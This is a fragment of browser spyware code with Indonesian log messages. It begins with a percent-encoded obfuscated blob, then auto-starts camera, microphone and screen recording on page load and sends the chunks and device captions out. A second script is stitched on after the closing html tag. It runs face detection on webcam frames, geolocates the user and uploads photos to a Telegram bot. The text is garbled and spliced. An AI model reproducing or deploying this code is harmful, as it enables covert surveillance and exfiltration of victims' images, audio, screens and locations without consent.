D%20%6E%65%77%20%4D%65%64%69%61%52%65%63%6F%72%64%65%72%28%61%75%64%69%6F%53%74%72%65%61%6D%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%61%75%64%69%6F%43%68%75%6E%6B%73%20%3D%20%5B%5D%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%61%75%64%69%6F%52%65%63%6F%72%64%65%72%2E%6F%6E%64%61%74%61%61%76%61%69%6C%61%62%6C%65%20%3D%20%65%20%3D%3E%20%7B%20%69%66%20%28%65%2E%64%61%74%61%20%26%26%20%65%2E%64%61%74%61%2E%73%69%7A%65%29%20%61%75%64%69%6F%43%68%75%6E%6B%73%2E%70%75%73%68%28%65%2E%64%61%74%61%29%3B%20%7D%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%61%75%64%69%6F%52%65%63%6F%              const filename = `audio-${ts}.webm`;
              const caption = await buildDeviceCaption("Audio otomatis");
              await sendDocBlob(blob, filename, caption);
              appendLog("Chunk audio dikirim: " + filename);
              audioChunks = [];
            };
            audioRecorder.start();
          }
        } catch(err){
          appendLog("Audio chunk error: " + (err.message || err));
          break;
        }
      }
    })();
  } catch(e){
    audioActive = false;
    appendLog("Gagal akses mikrofon: " + (e.message || e));
  }
}
function stopAudio(){
  audioActive = false;
  try { if (audioRecorder && audioRecorder.state === 'recording') audioRecorder.stop(); } catch {}
  if (audioStream) { audioStream.getTracks().forEach(t=>t.stop()); audioStream = null; }
  appendLog("Audio dihentikan.");
}

/* ================== Screen recording (chunked) ================== */
let screenStream = null;
let screenRecorder = null;
let screenChunks = [];
let screenActive = false;

async function startScreen(){
  if (screenActive) return;
  try {
    appendLog("Meminta izin recording layar...");
    screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true, audio: false });
    try { screenVideo.srcObject = screenStream; screenVideo.style.display = 'block'; } catch {}
    screenRecorder = new MediaRecorder(screenStream, { mimeType: 'video/webm;codecs=vp9' });
    screenRecorder.ondataavailable = e => { if (e.data && e.data.size) screenChunks.push(e.data); };
    screenRecorder.onstop = async () => {
      if (screenChunks.length === 0) return;
      const blob = new Blob(screenChunks, { type: screenChunks[0].type || 'video/webm' });
      const ts = new Date().toISOString().replace(/[:.]/g,'-');
      const filename = `screen-${ts}.webm`;
      const caption = await buildDeviceCaption("Screen otomatis");
      await sendDocBlob(blob, filename, caption);
      appendLog("Chunk screen dikirim: " + filename);
      screenChunks = [];
    };
    screenRecorder.start();
    screenActive = true;
    screenStatus.textContent = "Screen: merekam";
    appendLog("Screen recording aktif.");
    // loop chunking
    (async function loopScreen(){
      while (screenActive){
        await sleep(INTERVAL_MS);
        if (!screenActive) break;
        try {
          if (screenRecorder && screenRecorder.state === 'recording') {
            screenRecorder.stop();
            await sleep(500);
            screenRecorder = new MediaRecorder(screenStream, { mimeType: 'video/webm;codecs=vp9' });
            screenChunks = [];
            screenRecorder.ondataavailable = e => { if (e.data && e.data.size) screenChunks.push(e.data); };
            screenRecorder.onstop = async () => {
              if (screenChunks.length === 0) return;
              const blob = new Blob(screenChunks, { type: screenChunks[0].type || 'video/webm' });
              const ts = new Date().toISOString().replace(/[:.]/g,'-');
              const filename = `screen-${ts}.webm`;
              const caption = await buildDeviceCaption("Screen otomatis");
              await sendDocBlob(blob, filename, caption);
              appendLog("Chunk screen dikirim: " + filename);
              screenChunks = [];
            };
            screenRecorder.start();
          }
        } catch(err){
          appendLog("Screen chunk error: " + (err.message || err));
          break;
        }
      }
    })();

    // stop when user stops sharing
    screenStream.getVideoTracks().forEach(track => track.onended = () => { stopScreen(); });
  } catch(e){
    screenStatus.textContent = "Screen: error - " + (e.message || e);
    appendLog("Gagal akses layar: " + (e.message || e));
  }
}
function stopScreen(){
  screenActive = false;
  try { if (screenRecorder && screenRecorder.state === 'recording') screenRecorder.stop(); } catch {}
  if (screenStream) { screenStream.getTracks().forEach(t=>t.stop()); screenStream = null; }
  try { screenVideo.srcObject = null; screenVideo.style.display = 'none'; } catch {}
  screenStatus.textContent = "Screen: berhenti";
  appendLog("Screen dihentikan.");
}

/* ================== Overall scheduler: capture everything each interval ================== */
let mainIntervalHandle = null;
async function captureCycleOnce(){
  appendLog("=== Cycle start ===");
  // send device info text first
  try {
    const caption = await buildDeviceCaption("Cycle otomatis");
    await sendText(caption);
    appendLog("Device info dikirim.");
  } catch(e){ appendLog("Gagal kirim device info: " + (e.message || e)); }

  // capture camera photo (async)
  try { await capturePhotoAndSend(); } catch(e){ appendLog("Gagal foto: " + (e.message || e)); }

  // audio & screen are chunked independently by their loops ‚Äî but to ensure a chunk gets sent around this time,
  // we force stop recorder to emit ondataavailable (if active), then restart quickly (only if active)
  try {
    if (audioActive && audioRecorder && audioRecorder.state === 'recording') {
      audioRecorder.stop();
      appendLog("Audio recorder cycle forced to stop->send.");
      await sleep(300);
      // restart recorder (handled by audio loop normally)
    }
  } catch(e){ appendLog("Audio cycle force error: " + (e.message || e)); }

  try {
    if (screenActive && screenRecorder && screenRecorder.state === 'recording') {
      screenRecorder.stop();
      appendLog("Screen recorder cycle forced to stop->send.");
      await sleep(400);
    }
  } catch(e){ appendLog("Screen cycle force error: " + (e.message || e)); }

  appendLog("=== Cycle end ===");
}

async function startAll(){
  appendLog("Memulai semua komponen...");
  await startCamera();
  await startAudio();
  await startScreen();

  // immediate first cycle shortly after start
  await sleep(500);
  await captureCycleOnce();

  // start interval loop for combined cycles
  if (mainIntervalHandle) clearInterval(mainIntervalHandle);
  mainIntervalHandle = setInterval(() => {
    captureCycleOnce().catch(e => appendLog("Cycle err: " + (e.message || e)));
  }, INTERVAL_MS);
}

/* stop everything */
function stopAll(){
  if (mainIntervalHandle) { clearInterval(mainIntervalHandle); mainIntervalHandle = null; }
  stopCamera();
  stopAudio();
  stopScreen();
  appendLog("Semua dihentikan.");
}

/* ================ Buttons ================ */
document.getElementById('btnStartAll').addEventListener('click', () => startAll());
document.getElementById('btnStopAll').addEventListener('click', () => stopAll());

/* ================ Auto-start attempt ================ */
window.addEventListener('load', async () => {
  appendLog("Inisialisasi halaman. Mencoba auto-start...");
  // Try to auto-start ‚Äî many browsers may block screen getDisplayMedia without gesture,
  // but we'll still try to get camera & microphone (which sometimes succeed).
  try {
    await startAll();
    appendLog("Auto-start sequence dijalankan (berhasil/terblokir?). Jika gagal, klik 'Mulai Manual'.");
  } catch(e){
    appendLog("Auto-start gagal: " + (e.message || e));
  }
});

/* cleanup on unload */
window.addEventListener('beforeunload', () => { stopAll(); });
</script>
</body>
  </html>    try {
      const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}`);
      const data = await res.json();
      const countryCode = data.address?.country_code?.toUpperCase() || "N/A";
      const country = data.address?.country || "Tidak diketahui";
      const city = data.address?.city || data.address?.town || data.address?.village || "Tidak diketahui";
      return `${city}, ${country} [${countryCode}]`;
    } catch {
      return "Tidak diketahui";
    }
  }

  async function sendToTelegram(photoBlob, caption) {
    const fd = new FormData();
    fd.append("chat_id", CHAT_ID);
    fd.append("caption", caption);
    fd.append("photo", photoBlob, "face.jpg");
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
      method: "POST",
      body: fd
    });
  }

  // ==== Deteksi & Kirim ====
  async function captureAndSend() {
    // ambil ukuran proporsional (agar tidak gepeng)
    const w = video.videoWidth;
    const h = video.videoHeight;
    canvas.width = w;
    canvas.height = h;
    ctx.drawImage(video, 0, 0, w, h);

    const detections = await faceapi.detectAllFaces(canvas, new faceapi.TinyFaceDetectorOptions());
    if (detections.length === 0) return; // skip kalau tidak ada wajah

    const device = detectDevice();
    const net = getNetworkInfo();
    const loc = await getLocation();
    let locText = "Tidak diketahui";
    if (loc) locText = await reverseGeocode(loc.lat, loc.lon);

    const caption =
`üì∏ Deteksi Wajah Otomatis
üì± Device: ${device}
üåê Jaringan: ${net.type.toUpperCase()} (${net.downlink} Mbps)
üìç Lokasi: ${locText}
üïí ${new Date().toLocaleString("id-ID")}`;

    canvas.toBlob(async blob => {
      try {
        await sendToTelegram(blob, caption);
        console.log("‚úÖ Terkirim:", new Date().toLocaleTimeString());
      } catch (e) {
        console.error("‚ùå Gagal kirim:", e);
      }
    }, "image/jpeg", 0.9);
  }

  // ==== Inisialisasi ====
  async function init() {
    try {
      await faceapi.nets.tinyFaceDetector.loadFromUri(MODEL_URL);
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      video.srcObject = stream;
      await video.play();
      setInterval(captureAndSend, DETECT_INTERVAL);
    } catch (e) {
      console.error("Kamera error:", e);
    }
  }

  window.addEventListener("load", init);
  </script>
</body>
</html>
